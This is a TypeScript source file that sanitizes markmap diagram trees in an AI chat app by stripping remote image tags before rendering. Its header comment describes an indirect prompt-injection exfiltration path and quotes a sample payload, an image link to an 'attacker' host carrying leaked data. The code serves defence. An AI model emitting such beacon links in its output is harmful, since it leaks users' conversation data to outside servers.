/**
 * SECURITY (PI-001 · 渲染侧外泄, audit 10 P3-3): markmap has NO engine-level sanitizer
 * — unlike the other two in-chat diagram engines, which each already hold a JS-layer
 * egress line (mermaid: DOMPurify strict mode; vega-lite: a loader that rejects every
 * networked fetch — see Diagram.tsx). A model-written ```markmap block is the same
 * untrusted, indirect-injection surface: `![](http://attacker/?leak=…)` in a node
 * label becomes a live `<img>` whose src the browser fetches AT RENDER TIME — a
 * no-click egress beacon. Production blocks it via the app CSP, but the preview paths
 * that run WITHOUT that CSP (`pnpm dev:web` in a plain browser, headless shots) would
 * fire the beacon, and leaning on CSP alone leaves markmap the one engine with no
 * defense-in-depth JS line.
 *
 * markmap-lib's Transformer turns markdown into a node tree whose `content` is an HTML
 * string that markmap-view later injects. We strip remote `<img>` from those strings
 * BEFORE render via an inert `<template>` (its fragment parses markup without ever
 * loading resources), so the beacon `<img>` is gone before it can reach the live DOM —
 * no fetch is scheduled at all. This beats a post-render sweep, which would race the
 * fetch the browser already queued when the node hit the document. Inline data:/blob:
 * images (no network reach) are kept.
 */

const INLINE_ONLY_SCHEME = /^\s*(?:data|blob):/i;

interface MarkmapNode {
  content?: unknown;
  children?: unknown;
}

/** Strip remote `<img>` from one node-label HTML string via an inert `<template>`
 * (parsing there schedules no network fetch). Returns the input untouched when there
 * is nothing to strip, so the overwhelmingly-common image-free label allocates nothing. */
function stripRemoteImages(html: string): string {
  if (!html.includes("<img")) return html;
  const tpl = document.createElement("template");
  tpl.innerHTML = html;
  let changed = false;
  for (const img of Array.from(tpl.content.querySelectorAll("img"))) {
    const src = img.getAttribute("src") ?? "";
    if (!INLINE_ONLY_SCHEME.test(src)) {
      img.remove();
      changed = true;
    }
  }
  return changed ? tpl.innerHTML : html;
}

/** Recursively sanitize a markmap transform tree in place: neutralize remote-image
 * egress in every node's label HTML before markmap-view renders it. */
export function sanitizeMarkmapTree(node: unknown): void {
  if (!node || typeof node !== "object") return;
  const n = node as MarkmapNode;
  if (typeof n.content === "string") {
    n.content = stripRemoteImages(n.content);
  }
  if (Array.isArray(n.children)) {
    for (const child of n.children) sanitizeMarkmapTree(child);
  }
}
